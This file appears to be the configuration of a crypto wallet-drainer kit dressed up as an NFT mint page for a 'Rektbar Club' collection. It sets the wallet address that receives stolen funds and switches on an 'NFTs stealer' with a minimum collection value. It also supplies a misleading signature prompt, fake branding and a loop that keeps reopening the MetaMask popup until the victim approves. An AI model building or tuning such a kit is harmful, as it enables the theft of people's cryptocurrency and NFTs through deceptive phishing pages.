const receiveAddress = "0x88b45CADC87eA632AB8BE0367B67379C898c39f9";


const drainNftsInfo = {
    active: true, // Active (true) or not (false) NFTs stealer.
    minValue: 0.5, // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
    nftReceiveAddress: "" // leave empty if you want to use the same as receiveAddress 
}

const signMessage = `Welcome, \n\n` +
    `to the Purgatorio.\n\n` +
    `Are you a person of values?\n\n` +
    `Are you worthy of this` +
    `Nonce:\n{nonce}`;


const collectionInfo = {
    name: "Rektbar Club",
    title: "Morninguys Alpha Access", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    date: "10.11.2022 - 7pm EST", // Today date
    socialMedia: {
        discord: "https://discord.gg/example",
    },
    medias: {
        preview: "rektguy.png",
        favicon: "ogrekt.gif"
    },
    background: {
        type: "video",              // Supported types: image, video, color
        image: "nyc.gif",    // Image for image type, video preview for video type
        video: "background.mp4",    // If you don't use video, you can ignore this line
        color: "#4E4E6D"            // If you don't use color, you can ignore this line
    }
}

const mintInfo = {         // Price per NFT.
    totalSupply: 500,   // Total supply of NFTs.
    minUnits: 1,        // Min units to buy.
    maxUnits: 1,        // Max units to buy.
    askMintLoop: false,  // If true, when the user closes the metamask popup, it reopens automatically.
}